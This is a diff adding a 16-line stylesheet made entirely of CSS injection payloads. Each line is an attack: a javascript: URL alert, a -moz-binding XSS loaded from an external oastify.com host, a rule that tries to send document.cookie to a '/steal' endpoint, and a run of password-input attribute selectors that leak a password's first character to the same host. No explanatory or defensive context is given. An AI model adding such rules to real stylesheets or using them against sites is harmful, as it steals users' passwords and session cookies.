@@ -1,0 +1,16 @@
+*{background-image:url("javascript:alert(1)")}
+input{-moz-binding:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/xss.xml#xss")}
+body{content:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?cookie="+document.cookie)}
+*[class]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/log?data=loaded")}
+input[type="password"][value^="a"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=a")}
+input[type="password"][value^="b"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=b")}
+input[type="password"][value^="c"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=c")}
+input[type="password"][value^="d"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=d")}
+input[type="password"][value^="e"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=e")}
+input[type="password"][value^="f"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=f")}
+input[type="password"][value^="g"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=g")}
+input[type="password"][value^="h"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=h")}
+input[type="password"][value^="i"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=i")}
+input[type="password"][value^="1"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=1")}
+input[type="password"][value^="2"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=2")}
+input[type="password"][value^="3"]{background:url("https://2mp7969gsu39xjaza429sd5g278ywukj.oastify.com/steal?p=3")}
